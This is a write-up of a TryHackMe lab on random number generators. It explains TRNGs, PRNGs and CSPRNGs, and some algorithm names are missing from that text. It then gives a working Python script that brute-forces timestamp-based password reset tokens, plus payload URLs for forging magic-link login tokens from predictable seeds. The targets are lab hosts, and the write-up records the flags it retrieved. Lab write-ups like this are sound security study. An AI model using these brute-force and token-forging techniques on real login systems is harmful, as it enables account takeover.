
## True Random Number Generator (TRNG)

TRNGs generate randomness by relying on unpredictable physical phenomena like thermal noise or radioactive decay. Since these generators stem from natural events, they produce inherently random values. TRNGs are commonly used in highly sensitive cryptographic operations, such as generating the keys for algorithms like

or

. These keys are then used in tasks like encryption, digital signatures, and certificate creation, where unpredictability is crucial for security. However, TRNGs require specialised hardware and can be slower than other RNGs, making them less suitable for tasks requiring rapid number generation.

![An image showing the true random number generator process starting from a Seed value and how it generated true random numbers.](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1736933314835.svg)

As shown in the above figure, the basic workflow includes capturing a seeding value from a natural, unpredictable physical source. This value is then fed into hardware that performs a non-deterministic transformation to generate a sequence of truly random, unpredictable numbers. The output of TRNGs cannot be predicted or reproduced, making them ideal for high-security cryptographic operations.

## Pseudorandom Number Generator (PRNG)

PRNGs, unlike TRNGs, generate random numbers algorithmically based on an initial seed value. While they may appear random, they are deterministic, meaning the same seed will always produce the same sequence of numbers. PRNGs are faster and more efficient than TRNGs and are suitable for applications that quickly need large quantities of random numbers, like simulations or gaming. However, since they are algorithmic, predictability becomes a risk if an attacker can deduce the seed or its generation method.

We will examine the two primary types of PRNGs, statistical and cryptographic PRNGs, focusing on their differences and specific applications.

**Statistical PRNG**

Statistical PRNGs are designed to produce numbers that pass statistical randomness tests, meaning the numbers appear random and lack obvious patterns. These generators are widely used in non-security applications such as simulations, statistical sampling, and gaming, where randomness is required but not in a security-critical context. However, statistical PRNGs are deterministic by nature, meaning the same seed value will always produce the same sequence of numbers. This predictability makes them unsuitable for cryptographic tasks where unpredictability is paramount. 

**Cryptographically Secure PRNG (CSPRNG)**

A CSPRNG is a form of PRNG designed for cryptographic purposes, where randomness must be unpredictable and resistant to attack. Unlike statistical PRNGs, CSPRNGs produce computationally infeasible outputs to reverse-engineer, even if some of the output or internal state is known. CSPRNGs are critical in security-sensitive applications, including encryption key generation, session tokens, and secure random number generation for protocols. These generators must meet stringent requirements to ensure their output cannot be predicted, providing strong protection against cryptographic attacks. While they may be slower than statistical PRNGs due to additional security measures, they are essential for ensuring the integrity and security of cryptographic operations.

### Exercise : Weak or Insufficient Entropy

#### Decrypting the Reset Token via Script

Execute the script 
```
python3 exploit.py vicim UNIX_TIMESTAMP
```

The value `"300"` can be changed depending on the time range to be tested for 
```
import requests
import sys

# Function to brute force the reset token
def brute_force_token(username, start_timestamp):
    url = "http://random.thm:8090/case/reset_password.php"
    
    # Try tokens within a range of -5 minutes
    for i in range(-300, 0):
        current_timestamp = start_timestamp + i
        token = f"{username}{current_timestamp}"
        params = {'token': token}
        
        response = requests.get(url, params=params)
        
        # Check if the token is valid
        if "Invalid or expired token." not in response.text:
            print(f"Correct token identified: {token}")
            return token
        else:
            print(f"Tried token: {token} (Invalid)")
    
    print("No valid token found in the given range.")
    return None

if len(sys.argv) != 3:
    print("Usage: python exploit.py <username> <unix_timestamp>")
    sys.exit(1)

username = sys.argv[1]
start_timestamp = int(sys.argv[2])

brute_force_token(username, start_timestamp)
```

Acquire timestamp via
https://www.unixtimestamp.com/

**Payload**
`http://random.thm:8090/case/reset_password.php?token={Username}{timestamp_of_token_generation}`

`http://random.thm:8090/case/reset_password.php?token=master1774203922`

**Token is retrieved: victim1774188045**

#### Exploit
`http://random.thm:8090/case/reset_password.php?token=victim1774188045`

**Flag is Retrieved**
 Flag: THM{VICTIM_SIGNED_IN}

#### Exercise 2: Predictable  Seeds in PRNGs

The tool shows the possible seeds
![[possible_seeds.png]]

THM instructions say that `"970732804"` this is the correct one and to confirm it we use CyberChef recipe. 

##### Payload : Acquire Token

`http://ATTACKBOX_IP:8181/magic_link_login.php?email={email}&constant={constant}`

Practical Example
`http://192.168.141.140:8181/magic_link_login.php?email=hr@mail.random.thm&constant=1337`

##### Payload 2 : Login without Password
http://random.thm:8090/case/magic_link_login.php?token=MjU1MjEwNzUx



**PHP Server**
Start PHP server 
`"`php -S 0.0.0.0:8181`"`

**Flag retrieved:  THM{HR_SIGNED_IN1337}**

### Recap

Steps
1. Click button "Send Magic Link"
2. Start the PHP server with `"php -S 0.0.0.0:8181"`
3. Acquire the Token via the URL using constant `"1337"`
4. Try out each token until one works